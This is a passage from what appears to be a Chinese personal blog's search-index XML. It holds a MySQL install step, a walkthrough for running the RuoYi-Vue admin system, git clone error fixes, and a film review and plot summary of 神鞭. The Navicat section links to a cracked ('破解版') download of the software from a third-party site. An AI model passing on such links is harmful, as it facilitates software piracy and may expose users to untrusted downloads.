class="built_in">help</span>. Type <span class="string">'\c'</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>测试成功。</p><p>因为上面安装时默认开机自启动，所以这里mysql已经启动了，如果没启动可以管理员运行cmd，然后输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net start MySQL80</span><br><span class="line">请求的服务已经启动。</span><br><span class="line"></span><br><span class="line">请键入 NET HELPMSG 2182 以获得更多的帮助。</span><br></pre></td></tr></table></figure></li></ol><h1 id="5-mysql管理软件navicat-for-mysql"><a class="markdownIt-Anchor" href="#5-mysql管理软件navicat-for-mysql"></a> 5 MySQL管理软件（Navicat for MySQL）</h1><ol><li><p>安装正版Navicat for MySQL：<a href="https://www.downkuai.com/soft/112947.html" target="_blank" rel="noopener">破解版</a></p></li><li><p>打开Navicat for MySQL</p></li><li><p>新建一个连接，填写连接信息：</p><img src="https://s2.loli.net/2022/02/15/yiUoY5KaZOpRWrq.png" width="400" height="500" alt="图片名称" align="center" id="83"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【开源代码学习--若依】Windows下运行若依</title>
      <link href="/2022/02/15/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91Windows%E4%B8%8B%E8%BF%90%E8%A1%8C%E8%8B%A5%E4%BE%9D/"/>
      <url>/2022/02/15/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91Windows%E4%B8%8B%E8%BF%90%E8%A1%8C%E8%8B%A5%E4%BE%9D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>最近在为毕设选取后台管理框架，开始打算用自己熟悉的Flask，或者Django，毕竟后边恶意样本的检测和可视化编程主语言会是python，这样一来使用python系的框架会做到无缝衔接。</p><ul><li><strong>Flask</strong><ul><li><strong>redash</strong>：<a href="https://github.com/getredash/redash" target="_blank" rel="noopener">redash-Github</a>、<a href="https://gitee.com/mirrors/redash" target="_blank" rel="noopener">redash-Gitee</a>、<a href="https://cloud.tencent.com/developer/article/1669226" target="_blank" rel="noopener">redash-介绍</a>、<a href="https://redash.io/product/" target="_blank" rel="noopener">官网</a></li><li><strong>Flask-Admin-Dashboard</strong>：<a href="https://github.com/jonalxh/Flask-Admin-Dashboard" target="_blank" rel="noopener">Github</a></li></ul></li><li><strong>Django+Vue</strong><ul><li><strong>Medusa</strong>：<a href="https://github.com/Ascotbe/Medusa" target="_blank" rel="noopener">Github</a>、<a href="http://medusa.ascotbe.com/Documentation/#/Installation" target="_blank" rel="noopener">文档</a></li><li><a href="https://www.bilibili.com/video/BV1eK411p7Na/?spm_id_from=333.788.recommend_more_video.4" target="_blank" rel="noopener">Vue+Django整合</a></li></ul></li></ul><p>但是考虑到这些框架网上参考资料、视频教程较少，上手时间可能较长。所以最后决定使用若依前后端分离版本。</p><ul><li><strong>简介</strong>：基于SpringBoot、Spring Security、Jwt、Vue的前后端分离的后台管理系统，还有前后端不分离版本、cloud版本</li><li><strong>官网</strong>：<a href="http://ruoyi.vip/" target="_blank" rel="noopener">官网</a>、<a href="https://gitee.com/y_project/RuoYi-Vue" target="_blank" rel="noopener">源码</a>、<a href="http://doc.ruoyi.vip/ruoyi-vue/" target="_blank" rel="noopener">文档</a></li><li><strong>环境要求</strong>：<ul><li>JDK 1.8+ (推荐1.8版本)</li><li>Mysql (业务数据库) 5.7+ (推荐5.7版本)</li><li>Redis (缓存数据库) 3.0+</li><li>Maven 3.0+</li><li>Node 12+</li></ul></li><li><strong>开发工具</strong>：<ul><li><strong>IDEA</strong>：Spring Boot、Vue</li><li><strong>Navicat</strong>：mysql</li><li><strong>Another Redis Manager Desktop</strong>：Redis</li></ul></li></ul><p>主要参考教程：<a href="https://www.bilibili.com/video/BV1HT4y1d7oA?from=search&amp;seid=872568368355498822&amp;spm_id_from=333.337.0.0" target="_blank" rel="noopener">B站——楠哥教你学java</a></p><blockquote><p>使用开源项目的步骤：</p><ol><li>下载并运行</li><li>看懂业务流程</li><li>进行二次开发</li></ol></blockquote><h1 id="2-查看自己的环境"><a class="markdownIt-Anchor" href="#2-查看自己的环境"></a> 2 查看自己的环境</h1><p>打开<code>cmd</code>查看自己的环境，不满足上述 <strong>环境要求</strong> 的做出整改：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看java版本</span></span><br><span class="line">E:\&gt;java -version</span><br><span class="line">java version <span class="string">"1.8.0_301"</span></span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_301-b09)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.301-b09, mixed mode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看maven版本</span></span><br><span class="line">E:\&gt;mvn -v</span><br><span class="line"><span class="string">'mvn'</span> 不是内部或外部命令，也不是可运行的程序</span><br><span class="line">或批处理文件。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看Node版本</span></span><br><span class="line">E:\&gt;node -v</span><br><span class="line">v12.5.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis版本</span></span><br><span class="line">D:\developer\database\redis\soft&gt;redis-server.exe -v</span><br><span class="line">Redis server v=3.0.504 sha=00000000:0 malloc=jemalloc-3.6.0 bits=64 build=a4f7a6e86f2d60b3</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mysql版本查看</span></span><br><span class="line">E:\&gt;mysql --version</span><br><span class="line">mysql  Ver 8.0.28 <span class="keyword">for</span> Win64 on x86_64 (MySQL Community Server - GPL)</span><br></pre></td></tr></table></figure><h1 id="3-下载并打开"><a class="markdownIt-Anchor" href="#3-下载并打开"></a> 3 下载并打开</h1><p>IDEA从git链接导入项目，IDEA 打开总项目Spring Boot——<code>RuoYi-Vue</code>和前端项目Vue——<code>ruo-ui</code>。</p><p>下载源码之后<code>ruoyi-ui</code>是前端项目模块，<code>ruoyi-admin</code>是后端主模块，其他的是后端用到的其他模块。</p><p><code>sql</code>目录下会有两个sql文件，这两个sql文件就是数据文件，需要导入Mysql数据库。</p><h1 id="4-配置mysql"><a class="markdownIt-Anchor" href="#4-配置mysql"></a> 4 配置Mysql</h1><ol><li><p>安装MySQL：参考博客 <a href="https://dragonliu.tk/2022/02/15/Windows%E4%B8%8B%E5%AE%89%E8%A3%85MySQL/" target="_blank" rel="noopener">Windows下安装MySQL</a></p></li><li><p>打开Navicat，新建数据库：（<font color="red">切记在新建数据库时要将字符集设置为utf8不然在执行向数据库插入一些数据含有中文时会报错</font>）</p><img src="https://s2.loli.net/2022/02/15/NoME25r7z9hRUgj.png" width="600" height="400" alt="图片名称" align="center" id="84"></li><li><p>新建数据库完成后在数据库上右击-运行sql文件，这里使用的是Navicat连接工具。然后选中上面的sql目录下的<code>ry_20210908.sql</code>，点击开始，然后再执行sql目录下的<code>quartz.sql</code>；</p><img src="https://s2.loli.net/2022/02/15/htzbPfWQD9wXCV7.png" width="600" height="400" alt="图片名称" align="center" id="85"></li><li><p>初始化数据库完成之后，会在数据库下生成一些表，并在表中生成一些数据：</p><img src="https://s2.loli.net/2022/02/15/oSrLQtNIqgvYz2Z.png" width="1000" height="400" alt="图片名称" align="center" id="86"></li><li><p>在工程中配置数据库：</p><img src="https://s2.loli.net/2022/02/15/CiJu9dHyLBZoeTf.png" width="1000" height="200" alt="图片名称" align="center" id="87"></li></ol><h1 id="5-配置redis"><a class="markdownIt-Anchor" href="#5-配置redis"></a> 5 配置Redis</h1><ol><li><p>安装Redis：参考博客 <a href="https://dragonliu.tk/2022/02/15/Windows%E4%B8%8B%E5%AE%89%E8%A3%85Redis/" target="_blank" rel="noopener">Windows下安装Redis</a></p></li><li><p>在工程中配置数据库，若没修改Redis默认配置，无需改动下面的代码：</p><img src="https://s2.loli.net/2022/02/15/d14ySpXGZjfEAO3.png" width="1000" height="200" alt="图片名称" align="center" id="91"></li></ol><h1 id="6-运行后端"><a class="markdownIt-Anchor" href="#6-运行后端"></a> 6 运行后端</h1><p>找到启动程序，右键运行即可：</p><img src="https://s2.loli.net/2022/02/15/gOrfEjoFSdXpNH5.png" width="1000" height="200" alt="图片名称" align="center" id="92"><p>等待一段时间，Console中输出：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">16:35:40.364 [restartedMain] INFO  o.a.c.h.Http11NioProtocol - [<span class="built_in">log</span>,173] - Starting ProtocolHandler [<span class="string">"http-nio-8080"</span>]</span><br><span class="line">16:35:40.534 [restartedMain] INFO  c.r.RuoYiApplication - [logStarted,61] - Started RuoYiApplication <span class="keyword">in</span> 6.585 seconds (JVM running <span class="keyword">for</span> 7.614)</span><br><span class="line">(♥◠‿◠)ﾉﾞ  若依启动成功   ლ(´ڡ`ლ)ﾞ  </span><br><span class="line"> .-------.       ____     __        </span><br><span class="line"> |  _ _   \      \   \   /  /    </span><br><span class="line"> | ( <span class="string">' )  |       \  _. /  '</span>       </span><br><span class="line"> |(_ o _) /        _( )_ .<span class="string">'         </span></span><br><span class="line"><span class="string"> | (_,_).'</span> __  ___(_ o _)<span class="string">'          </span></span><br><span class="line"><span class="string"> |  |\ \  |  ||   |(_,_)'</span>         </span><br><span class="line"> |  | \ `<span class="string">'   /|   `-'</span>  /           </span><br><span class="line"> |  |  \    /  \      /           </span><br><span class="line"> <span class="string">''</span>-<span class="string">'   `'</span>-<span class="string">'    `-..-'</span>              </span><br><span class="line">16:35:41.546 [Quartz Scheduler [RuoyiScheduler]] INFO  o.q.c.QuartzScheduler - [start,547] - Scheduler RuoyiScheduler_<span class="variable">$_LAPTOP</span>-NE344QFT1644914139051 started.</span><br><span class="line">16:36:15.811 [http-nio-8080-exec-1] INFO  o.a.c.c.C.[.[.[/] - [<span class="built_in">log</span>,173] - Initializing Spring DispatcherServlet <span class="string">'dispatcherServlet'</span></span><br></pre></td></tr></table></figure><p>打开浏览器，输入<code>http://localhost:8080/</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">欢迎使用RuoYi后台管理框架，当前版本：v3.8.1，请通过前端地址访问。</span><br></pre></td></tr></table></figure><p>至此，后端运行成功。</p><h1 id="7-运行前端"><a class="markdownIt-Anchor" href="#7-运行前端"></a> 7 运行前端</h1><p>在IDEA中打开 <code>Terminal</code> 标签，并输入 <code>npm install --registry=https://registry.npm.taobao.org</code> 安装依赖：</p><img src="https://s2.loli.net/2022/02/15/qAkZxnyW1PbSr7N.png" width="1000" height="200" alt="图片名称" align="center" id="93"><p>等待依赖安装完成，启动服务：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">E:\05 Code\RMDVS\RuoYi-Vue\ruoyi-ui&gt;npm run dev</span><br><span class="line"></span><br><span class="line">&gt; ruoyi@3.8.1 dev E:\05 Code\RMDVS\RuoYi-Vue\ruoyi-ui</span><br><span class="line">&gt; vue-cli-service serve</span><br><span class="line"></span><br><span class="line"> INFO  Starting development server...</span><br><span class="line">98% after emitting CopyPlugin</span><br><span class="line"></span><br><span class="line"> DONE  Compiled successfully <span class="keyword">in</span> 20312ms                                                                                                                                                               18:05:56</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  App running at:</span><br><span class="line">  - Local:   http://localhost:80/</span><br><span class="line">  - Network: http://192.168.1.7:80/</span><br><span class="line"></span><br><span class="line">  Note that the development build is not optimized.</span><br><span class="line">  To create a production build, run npm run build.</span><br></pre></td></tr></table></figure><p>启动成功后，会自动跳转到浏览器 <code>http://localhost:80/</code>，然后能出现验证码则是请求后台成功。</p><img src="https://s2.loli.net/2022/02/15/4TGiZCcwX827Eno.png" width="600" height="400" alt="图片名称" align="center" id="94"><p>登陆成功，至此前端启动成功。</p><img src="https://s2.loli.net/2022/02/15/gdFxAsfShMykPvw.png" width="800" height="400" alt="图片名称" align="center" id="95"><p>至此，若依系统前后端全部启动成功！！</p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/BADAO_LIUMANG_QIZHI/article/details/108465662" target="_blank" rel="noopener">若依前后端分离版手把手教你本地搭建环境并运行项目</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git clone失败整理</title>
      <link href="/2022/02/14/git-clone%E5%A4%B1%E8%B4%A5%E6%95%B4%E7%90%86/"/>
      <url>/2022/02/14/git-clone%E5%A4%B1%E8%B4%A5%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-errno-10054"><a class="markdownIt-Anchor" href="#1-errno-10054"></a> 1 errno 10054</h1><p>翻墙了，但是仍然出现下面的报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cloning into <span class="string">'redash'</span>...</span><br><span class="line">fatal: unable to access <span class="string">'https://github.com/getredash/redash.git/'</span>: OpenSSL SSL_read: Connection was reset, errno 10054</span><br></pre></td></tr></table></figure><p>可能是因为代码库太大，调高 <code>git buffer size</code> 即可：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1 全局修改</span></span><br><span class="line">git config --global http.postBuffer 524288000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2 只针对当前仓库</span></span><br><span class="line">git init</span><br><span class="line">git config http.postBuffer 524288000</span><br><span class="line">git remote add origin &lt;REPO URL&gt;</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><p>重开cmd，倘若还不成功，重复几次即可。</p><ul><li><a href="https://stackoverflow.com/questions/46232906/git-clone-error-rpc-failed-curl-56-openssl-ssl-read-ssl-error-syscall-errno" target="_blank" rel="noopener">stackoverflow问答</a></li></ul><h1 id="2-443timed-out"><a class="markdownIt-Anchor" href="#2-443timed-out"></a> 2 443：Timed out</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cloning into <span class="string">'redash'</span>...</span><br><span class="line">fatal: unable to access <span class="string">'https://github.com/getredash/redash.git/'</span>: Failed to connect to github.com port 443: Timed out</span><br></pre></td></tr></table></figure><p>翻墙是一种方法，其他待整理</p><h1 id="3-openssl-ssl_connect-ssl_error_syscall"><a class="markdownIt-Anchor" href="#3-openssl-ssl_connect-ssl_error_syscall"></a> 3 OpenSSL SSL_connect: SSL_ERROR_SYSCALL</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cloning into <span class="string">'addlcov'</span>...</span><br><span class="line">fatal: unable to access <span class="string">'https://github.com/Dragonliu2018/addlcov.git/'</span>: OpenSSL SSL_connect: SSL_ERROR_SYSCALL <span class="keyword">in</span> connection to github.com:443</span><br></pre></td></tr></table></figure><p>又试了一次，成功下载。</p>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《神鞭》电影(1986)</title>
      <link href="/2022/02/12/%E3%80%8A%E7%A5%9E%E9%9E%AD%E3%80%8B%E7%94%B5%E5%BD%B1/"/>
      <url>/2022/02/12/%E3%80%8A%E7%A5%9E%E9%9E%AD%E3%80%8B%E7%94%B5%E5%BD%B1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-影片信息"><a class="markdownIt-Anchor" href="#1-影片信息"></a> 1 影片信息</h1><ul><li>片名：神鞭</li><li>又名：The Magic Braid</li><li>导演：张子恩</li><li>编剧：张子恩</li><li>主演：王亚为、徐守莉、陈宝国、张嬿、</li><li>上映：1986</li><li>类型：动作/历史/古装</li><li>片长：95分钟</li><li>地区：中国大陆</li><li>语言：汉语普通话</li><li>IMDb：tt0397625</li></ul><h1 id="2-剧情简介"><a class="markdownIt-Anchor" href="#2-剧情简介"></a> 2 剧情简介</h1><p>清朝末年，天津城了出现一个恶霸地痞——玻璃花（陈宝国 饰），他无恶不作、欺行霸市。一日，卖豆腐的老实人傻二（王亚为 饰）和玻璃花较上了劲，争执中傻二甩开自己的辫子还击，玻璃花被抽得毫无还手之力，落荒而逃。不日玻璃花纠集了一伙武林高手来找傻二寻仇，憨二照样甩开自己又粗又长的还击，竟然打败了一众高手！从此“神鞭”傻二的名声传扬开来。八国联军入侵时，傻二加入了义和团，“神鞭”歼敌无数，立下了赫赫战功……</p><h1 id="3-台词"><a class="markdownIt-Anchor" href="#3-台词"></a> 3 台词</h1><blockquote><p><font color="blue">玻璃花</font>：哪位没提裤子把你给露出来了。</p></blockquote><hr><blockquote><p><font color="blue">金菊花</font>：辫剪了，神留着</p><p><font color="blue">傻二</font>：对，辫剪了，神留着。祖宗的东西再好，该割的时候就得割。无论怎么变，也难不死咱们。什么新玩意儿都能玩到家，一变还得是绝活儿。</p></blockquote><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p><a href="https://dragonliu.tk/2022/02/12/%E3%80%8A%E7%A5%9E%E9%9E%AD%E3%80%8B%E4%B9%A6%E7%B1%8D/" target="_blank" rel="noopener">博客——《神鞭》书籍</a></p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 他评</h1><blockquote><center>改革开放练就“神鞭”</center><p>本来不想写，把其他影评看过一篇，怒其差劲委曲了一部好片。什么乡绅金老爷，片里交待的清清楚楚是个穷秀才，全都是这种水平的穷bb还那么多人点有用，难怪过了大几十年还要反思这段愚昧野蛮的历史。</p><p>这是部好片，用狗眼当然看不出来。影片明着刻画了玻璃花古董商这样的臭流氓狗奴才，暗里也勾勒出所有在位者的丑陋嘴脸。当官的虚伪不用说，就说说民团首领曹大师兄吧，有如京剧名角亮相一般端着身架迈着台步出场。且不用赘述他如何唱念做打，仅看他上场前后镜头刻意交待的众多靓妹侍从！再结合后面老少爷们英勇全军覆没却不见曹大师兄师妹踪迹，这是个什么东西就跃然纸上了。当然还少不了输急了背后发镖的武林宗师索老爷。与此相对的是一身草莽气的市井高手，虽然也玩了个一发两弹的技俩，但从头到尾都没阴的，大方认输，也算教训了恶人。其他如古董奸商药铺老板娘官妾之流阳奉阴违欺软怕硬的嘴脸也刻画的活灵活现。</p><p>王国维独爱以血书者，我观此片此书就看到了这样的作者。惟以血者书，才能这样淋漓的表达着对国人“怒其不争，哀其不幸”。片尾的傻二的话直到今天仍然振聋发聩！</p><p>——   <font color="blue">引自 <a href="https://movie.douban.com/review/10056840/?dt_dapp=1&amp;dt_platform=com.douban.activity.qq_session" target="_blank" rel="noopener">豆瓣 德尔苏 </a></font></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 影视 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《神鞭》书籍</title>
      <link href="/2022/02/12/%E3%80%8A%E7%A5%9E%E9%9E%AD%E3%80%8B%E4%B9%A6%E7%B1%8D/"/>
      <url>/2022/02/12/%E3%80%8A%E7%A5%9E%E9%9E%AD%E3%80%8B%E4%B9%A6%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>清朝末年，一个海神娘娘“出巡散福”之日，津门各会热闹非凡。盐务展老爷新娶的小老婆飞来凤这一天大出风头，逢会必截，犒赏丰厚。突然，估衣街上的大混星子玻璃花跳出来横生事端，故意挑衅。众人劝说无效，僵持不下。人群里走出一个带点傻气的汉子，对玻璃花好言相劝。这大混星子不但不听，还张狂地要来揪他头上那根粗黑油亮招人眼目的大辫子。不料，那“傻巴”的辫子竟像皮鞭一样，把玻璃花抽了个鼻青脸肿。玻璃花在估衣街上栽了面子，他发誓一定要找到那“傻巴”一决雌雄。</p><p>经多方打听，方知那人是城西挑担卖炸豆腐的“傻二”。混星子死崔为垄断估衣街，借机除掉玻璃花，便撺掇他去找津门“三大块儿”中能耐最大的戴奎一帮忙“拔撞”。戴打得一手好弹弓，可称天下奇绝。死崔怕戴奎一不答应，顺口瞎编说人称傻二那辫子叫“神鞭”，奎的弹弓子不过是小菜儿，用激将法煽风点火，烧起戴的嫉妒心，使他下决心会一会傻二。不料，傻二用辫子不仅轻轻巧巧就打掉了戴的泥弹丸，还抽掉了他的绝活“双珠争冠”，羞得戴奎一无地自容。从此，“神鞭”的名声便传开了。</p><p>原来，傻二自小跟爹爹学辫子功，不曾与人交手，不知如此神速和厉害！而且使起来，随心所欲，意到辫子到，甚至意未到辫子已到。他爹临终前曾告诫他，这辫子功传子传孙，不传外人。不到万不得已不使出来，否则将招灾惹祸。果然，先是玻璃花，后是戴奎一，戴奎一引来在西市上的砸砖头的王砍天，王砍天又引来鸟市上拉硬弓的柳梆子……全叫他抽跑了。</p><p>四门千总马老爷打发人拿来贴子请他去，想派给他一个小缺，在护城营当什长，教授武功。但他家世代不沾官场，推掉了这个差事。千总爷也不勉强他，只叫他耍耍辫子，当玩意儿看看。他只花里胡梢耍一通，还当场打落了几只蜻蜒。千总爷看呆了，当即把府、县、镇、署、前后左右各营中的几位老爷请来观看，个个开了眼，赏了他许多财物。“神鞭”的绰号也愈叫愈响。</p><p>一天，号称津门武林的祖师爷索天响忽然找上门来，说要教教傻二如何做人，见面先是“盘道”，从“形意”到“少林王拳”到“三层”，侃侃而谈，如数家珍。接着又表演了几招漂漂亮亮的拳腿。看得傻二心服口服。不料，这祖师爷待到与傻二交手时，没交几个回合，竟有些微喘。他见明打不成，便使出暗器，被傻二的辫子抽了个正着。最后灰溜溜地走了。傻二开始信服自己的本领，他愈发感到这辫子真是随心所欲，挥洒自如，刚猛又轻柔，灵巧又恢宏，似有一股扫荡天下、所向无敌之势。</p><p>紫竹林里的东洋武士佐藤秀郎闻说此事，把玻璃花叫去询问了一番“神鞭”的能耐，并拜托他下战表给傻二，要和“神鞭”比试比试。傻二接到战表，正犹豫不决，武林高手鼻子李特意前来给他鼓气，指点迷津，要他一定打败洋人。比武这天，身材挫小的佐藤秀郎事先立了个桩，站在桩上，想居高临下，逮机会捉傻二的鞭子。傻二看破对方招数，想出对策，不让他抓住自己的辫子，拳掌辫并用，直把东洋武士晕头转向地扔到对面的戏台上。傻二鞭打东洋武士，不单威震津门，也落得美名四扬。有人送来两块横匾，一是“张我国威”，一是“神鞭”。许多好武少年求他开山收徒，被他一一拒绝。</p><p>玻璃花见不能取胜，便伙同假洋鬼子收买剃头刮脸的王老六，要他趁给傻二剃头时把“神鞭”割下来。事虽不成，却使傻二吃惊不小。卖字画的金子仙劝导他该视这辫子为国宝，加倍爱惜。</p><p>傻二想既然自己的功夫不能外传，就该赶紧娶妻生子，传衍神功。便托金子仙帮他找个媳妇。金家正好有个老闺女金菊花，就送过门来。金菊花人勤恳诚实，对他的辫子尽心尽力地爱惜。</p><p>光绪二十六年，天下闹起义和拳。直隶省遍地义和拳纷纷竖旗立坛。附近各地团民潮水般地涌进天津卫，与紫竹林的毛子们交上火。傻二爹爹生前的朋友刘四叔受义和团总头领曹福田之命来请他，并告诉了他家辫子功的由来：傻二的老祖宗原先练的是问心拳，传自佛门，都是脑袋上的功夫。但必须仿效和尚剃光头，为了交手时不叫对方抓住头发。清军入关后，男人必须留辫子。这一变革绝了傻二家的武艺。逼得傻二的老祖宗把功夫改用在辫子上，才创出这独异奇绝的辫子功。刘四叔责问他身怀绝技，为何不上阵灭敌，光宗耀祖。傻二听了，这就跟刘四叔走。</p><p>他来到吕祖堂，看了一番义和团刀枪不入的表演，又受了曹福田写的一张咒符，便带一路团民与毛子们交手。开始，近距离的肉搏战使毛子们吃了大亏，他们便退到土岗子后边放枪，团民们纷纷中弹倒下，傻二也被炮弹震昏了过去。待他醒来一看，满地都是死人，刘四叔带的吹歌会已全部捐了性命。再一看辫子，竟叫洋枪子儿打断了，神鞭完了。</p><p>傻二逃回金子仙家，藏了半年多。金子仙四下打听，才打听到估衣街瑞芝堂的冯掌柜有生发的秘方。按方一用，傻二日见细黄的头发渐渐变黑变粗，过年转春，一条光滑乌亮又粗又长的神鞭完全复元了。尽管如此，傻二心里很不是滋味。随着洋货涌进，金子仙的字画生意每况愈下，生活窘困，加之金菊花不能生育，不得已，傻二开馆收徒，靠徒弟的学艺钱和额外的孝顺糊口。</p><p>几年之后，大清朝亡了，外边忽然闹起剪辫子。这时的玻璃花混进了“巡防营”的洋枪队，不但剪了傻二徒弟的辫子，还上门来要和傻二算旧帐。傻二一声不吭，闭门不出，不久就失踪了。一年过后，玻璃花到南门外小铁铺取锁栅门的大链子，正抽着烟，突然不知哪来连发三枪，一枪打灭他的烟头，一枪打断了烟卷，再一枪打飞了他的帽子。接着有一少年来下贴子，说有人要会他。玻璃花一去，见是剃了光头的傻二，如今竟成了双枪神射手，就像他当年的神鞭一样纯熟快捷，神鬼莫测。看得玻璃花真正心服。不久，传说北伐军中有一个神枪手，双手打枪，是个地地道道的天津人，可谁也说不出这人的姓名。只有玻璃花心中有数。</p><h1 id="2-作者"><a class="markdownIt-Anchor" href="#2-作者"></a> 2 作者</h1><p>冯骥才，浙江宁波慈溪人，1942年2月9日生于天津，作家、画家。 早年在天津从事绘画工作，后专职文学创作和民间文化研究。</p><ul><li><a href="https://baike.baidu.com/item/%E5%86%AF%E9%AA%A5%E6%89%8D/630264?fr=aladdin" target="_blank" rel="noopener">百度百科</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%86%AF%E9%AA%A5%E6%89%8D" target="_blank" rel="noopener">维基百科</a></li></ul><h1 id="3-摘抄"><a class="markdownIt-Anchor" href="#3-摘抄"></a> 3 摘抄</h1><blockquote><p>古古古古古古古，今今今今今今今，<br>古非今兮今非古，今亦古兮古亦今；<br>多向精气神里找，少从口眼鼻上认，<br>书里书外常碰巧，看罢一笑莫细品。</p><p>—— <font color="green">引自  引子</font></p></blockquote><hr><blockquote><p>反正老天爷不会一边倒。这世道就像一杆秤，不会总摆不平；无论身内身外的事，都好比撂在这秤上。一头压下去，另一头就该翘起来。月光照完东窗，渐渐去照西窗；运气和霉气一样，在众人头上蹦来蹦去。日头太毒，便逼来浓云疾雨；雨下得过狂，又招来一阵大风，直把云彩吹得一丝不见。</p><p>—— <font color="green">引自  第二回 跳出一个大傻巴</font></p></blockquote><hr><blockquote><p>别信那套！嘛叫哥儿们爷儿们？不过为了给自己助威。轮到两人分一块肉时，刀尖又专往哥儿们身上要命的地方捅。</p><p>—— <font color="green">引自  第三回 